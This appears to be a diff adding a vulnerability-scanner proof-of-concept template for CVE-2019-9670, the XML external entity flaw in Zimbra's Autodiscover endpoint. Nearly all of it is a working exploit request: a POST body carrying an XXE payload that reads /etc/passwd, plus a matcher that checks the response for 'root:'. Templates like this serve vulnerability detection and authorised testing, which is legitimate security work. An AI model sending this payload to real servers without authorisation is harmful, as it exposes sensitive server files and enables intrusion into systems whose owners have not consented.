@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "Zimbra Collaboration Suite Autodiscover 组件 XML 外部实体注入漏洞验证，通过构造包含恶意 DTD 的 POST 请求读取服务器敏感文件 /etc/passwd"
+id = "POC-AVE-2019-1684"
+name = "Synacor Zimbra Autodiscover XXE Injection"
+severity = "critical"
+tags = ["ave-2019-1684"]
+vuln_id = [
+    "CVE-2019-9670",
+    "AVE-2019-1684",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/Autodiscover/Autodiscover.xml"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
+<Request>
+<EMailAddress>aaaaa</EMailAddress>
+<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
+</Request>
+</Autodiscover>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
